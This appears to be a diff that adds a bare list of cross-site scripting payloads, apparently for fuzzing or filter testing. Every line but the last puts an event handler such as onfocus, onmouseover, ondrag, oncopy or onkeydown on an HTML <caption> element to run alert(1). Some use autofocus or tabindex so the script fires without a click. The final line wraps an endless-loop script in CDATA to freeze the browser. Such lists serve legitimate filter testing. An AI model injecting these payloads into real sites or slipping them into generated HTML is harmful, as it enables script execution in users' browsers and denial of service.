@@ -1,0 +1,33 @@
+<caption draggable="true" ondrag="alert(1)">test</caption>
+<caption draggable="true" ondragend="alert(1)">test</caption>
+<caption draggable="true" ondragenter="alert(1)">test</caption>
+<caption draggable="true" ondragleave="alert(1)">test</caption>
+<caption draggable="true" ondragstart="alert(1)">test</caption>
+<caption id=x tabindex=1 onactivate=alert(1)></caption>
+<caption id=x tabindex=1 onbeforeactivate=alert(1)></caption>
+<caption id=x tabindex=1 onbeforedeactivate=alert(1)></caption><input autofocus>
+<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>
+<caption id=x tabindex=1 onfocus=alert(1)></caption>
+<caption id=x tabindex=1 onfocusin=alert(1)></caption>
+<caption onbeforecopy="alert(1)" contenteditable>test</caption>
+<caption onbeforecut="alert(1)" contenteditable>test</caption>
+<caption onbeforepaste="alert(1)" contenteditable>test</caption>
+<caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>
+<caption onclick="alert(1)">test</caption>
+<caption oncontextmenu="alert(1)">test</caption>
+<caption oncopy="alert(1)" contenteditable>test</caption>
+<caption oncut="alert(1)" contenteditable>test</caption>
+<caption ondblclick="alert(1)">test</caption>
+<caption onfocusout=alert(1) tabindex=1 id=x></caption><input autofocus>
+<caption onkeydown="alert(1)" contenteditable>test</caption>
+<caption onkeypress="alert(1)" contenteditable>test</caption>
+<caption onkeyup="alert(1)" contenteditable>test</caption>
+<caption onmousedown="alert(1)">test</caption>
+<caption onmouseenter="alert(1)">test</caption>
+<caption onmouseleave="alert(1)">test</caption>
+<caption onmousemove="alert(1)">test</caption>
+<caption onmouseout="alert(1)">test</caption>
+<caption onmouseover="alert(1)">test</caption>
+<caption onmouseup="alert(1)">test</caption>
+<caption onpaste="alert(1)" contenteditable>test</caption>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
